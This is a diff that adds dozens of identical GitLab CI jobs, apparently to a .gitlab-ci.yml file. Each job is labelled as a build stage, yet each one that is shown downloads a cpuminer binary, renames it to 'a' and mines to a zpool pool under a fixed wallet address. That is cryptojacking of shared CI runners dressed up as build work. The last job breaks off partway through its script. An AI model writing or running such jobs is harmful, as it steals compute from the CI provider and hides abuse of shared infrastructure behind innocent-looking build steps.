+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gd:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_ge:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gf:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gg:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gh:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gi:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gj:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gk:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gl:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gm:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gn:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_go:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gp:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gq:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gr:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gs:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gt:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gu:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gv:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gw:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gx:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gy:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gz:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g1a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g2a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g3a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+
+build_g4a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g5a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g6a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g7a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g8a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g9a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g10a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g11a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g12a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g13a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g14a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g15a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g16a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g17a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g18a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g19a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g20a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g21a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g22a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g23a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g24a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g25a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g26a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g27a:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_ga1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gb1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gc1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gd1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_ge1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gf1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gh1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gi1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gj1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gk1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g1l:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gm1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gn1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_go1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gp1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gq1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gr1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gs1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gt1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gu1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
